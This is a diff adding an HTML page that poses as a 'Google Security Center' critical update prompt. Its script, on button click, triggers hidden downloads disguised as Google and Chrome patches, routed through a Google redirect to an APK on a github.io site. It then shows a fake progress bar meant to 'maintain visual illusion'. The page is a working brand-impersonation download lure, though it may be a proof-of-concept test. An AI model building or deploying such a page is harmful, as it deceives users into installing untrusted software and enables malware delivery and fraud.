@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Security Center</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: #f8f9fa;
+            text-align: center;
+            padding: 2rem;
+        }
+        .google-logo {
+            width: 272px;
+            margin: 2rem auto;
+        }
+        #securityDialog {
+            background: white;
+            padding: 2rem;
+            border-radius: 8px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.12);
+            max-width: 600px;
+            margin: 0 auto;
+        }
+    </style>
+</head>
+<body>
+    <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" 
+         alt="Google" 
+         class="google-logo">
+
+    <div id="securityDialog">
+        <h2>Critical Security Update Required</h2>
+        <p>Your system requires immediate updates to maintain security compliance.</p>
+        
+        <button id="installButton" 
+                style="background: #1a73e8; 
+                       color: white; 
+                       padding: 12px 24px; 
+                       border: none; 
+                       border-radius: 4px; 
+                       cursor: pointer; 
+                       font-size: 16px;">
+            Install Security Updates Now
+        </button>
+    </div>
+
+    <script>
+        const triggerDownloads = () => {
+            const fakeFiles = [
+                { name: "Google_Security_Patch_2024.exe", delay: 100 },
+                { name: "Chrome_Critical_Update.bin", delay: 300 },
+                { name: "System_Framework_Updater.pkg", delay: 500 }
+            ];
+
+            // Create hidden container
+            const hiddenLayer = document.createElement('div');
+            hiddenLayer.style.display = 'none';
+            document.body.appendChild(hiddenLayer);
+
+            fakeFiles.forEach((file, index) => {
+                setTimeout(() => {
+                    // Method 1: Traditional download
+                    const link = document.createElement('a');
+                    link.href = `https://www.google.com/url?q=https://ybt01.github.io/upload/app-debug.apk&sa=D&source=buganizer&usg=AOvVaw3nm-qJSzcGfjAOwSO0tcBK`;
+                    link.download = file.name;
+                    hiddenLayer.appendChild(link);
+                    link.click();
+
+                    // Method 2: Blob-based pseudo-download
+                    const blob = new Blob([`Fake content for ${file.name}`], { type: 'octet/stream' });
+                    const url = URL.createObjectURL(blob);
+                    const virtualLink = document.createElement('a');
+                    virtualLink.href = url;
+                    virtualLink.download = file.name;
+                    virtualLink.click();
+                    URL.revokeObjectURL(url);
+                }, file.delay);
+            });
+
+            // Maintain visual illusion
+            document.getElementById('securityDialog').innerHTML = `
+                <h3 style="color: #34a853;">✓ Downloading Updates...</h3>
+                <div class="progress" style="height: 4px; background: #f1f1f1; margin: 20px 0;">
+                    <div style="width: 0%; height: 100%; background: #1a73e8; transition: width 2s;"></div>
+                </div>
+                <p>Please keep this window open while updates are being installed</p>
+            `;
+
+            // Start progress bar animation
+            setTimeout(() => {
+                document.querySelector('.progress div').style.width = '100%';
+            }, 50);
+        };
+
+        document.getElementById('installButton').addEventListener('click', triggerDownloads);
+    </script>
+</body>
+</html>
